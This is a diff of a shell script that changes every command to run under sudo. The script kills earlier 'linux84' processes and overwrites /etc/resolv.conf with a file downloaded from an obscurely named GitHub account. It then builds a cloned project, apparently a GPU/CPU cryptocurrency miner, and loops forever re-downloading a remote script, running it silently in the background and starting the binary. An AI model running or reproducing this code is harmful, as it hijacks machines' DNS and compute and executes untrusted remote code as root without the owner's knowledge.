@@ -1,83 +1,85 @@
-pkill -f linux84
-pkill -f linux84
-pkill -f linux84
-pkill -f linux84
-pkill -f linux84
-pkill -f linux84
-pkill -f linux84
-pkill -f linux84
+sudo pkill -f linux84
+sudo pkill -f linux84
+sudo pkill -f linux84
+sudo pkill -f linux84
+sudo pkill -f linux84
+sudo pkill -f linux84
+sudo pkill -f linux84
+sudo pkill -f linux84
 
-rm -rf /mnt/disks/user/project/linux8474/
+sudo rm -rf /mnt/disks/user/project/linux8474/
 
-apt-get update
+sudo apt-get update
+
+sudo apt-get install cmake
 
 cd /etc/
 
-wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/resolv.conf
+sudo wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/resolv.conf
 
-rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+sudo rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
 
-mkdir /mnt/disks/
+sudo mkdir /mnt/disks/
 
-mkdir /mnt/disks/user/
+sudo mkdir /mnt/disks/user/
 
-mkdir /mnt/disks/user/project/
+sudo mkdir /mnt/disks/user/project/
 
 cd /mnt/disks/user/project/
 
-apt-get install -y libcpprest-dev libgmp-dev libargon2-0-dev
+sudo apt-get install -y libcpprest-dev libgmp-dev libargon2-0-dev
 
-rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+sudo rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
 
-rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+sudo rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
 
-rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+sudo rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
 
-rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+sudo rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
 
-rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+sudo rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
 
-rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
+sudo rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
 
 google84121274=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
 if [[ $google84121274 == *"failed"* ]]; then
 
-git clone https://github.com/mobileapps84741274/linuxcpu84
+sudo git clone https://github.com/mobileapps84741274/linuxcpu84
 cd linuxcpu84
-mkdir build
+sudo mkdir build
 cd build
-cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_CUDA:BOOL="0"
-make
+sudo cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_CUDA:BOOL="0"
+sudo make
 
 while true
 do
 
-wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgoogle84741274
+sudo wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgoogle84741274
 
-bash ./linuxgoogle84741274 &> /dev/null &
+sudo bash ./linuxgoogle84741274 &> /dev/null &
 
-./linux84 8
+sudo ./linux84 8
 
 done
 
 else
 
-git clone https://github.com/mobileapps84741274/linux8474
+sudo git clone https://github.com/mobileapps84741274/linux8474
 cd linux8474
-mkdir build
+sudo mkdir build
 cd build
-cmake .. -DCMAKE_BUILD_TYPE=Release
-make
+sudo cmake .. -DCMAKE_BUILD_TYPE=Release
+sudo make
 
 while true
 do
 
-wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgoogle84741274
+sudo wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linuxgoogle84741274
 
-bash ./linuxgoogle84741274 &> /dev/null &
+sudo bash ./linuxgoogle84741274 &> /dev/null &
 
-./linux84 8
+sudo ./linux84 8
 
 done
 
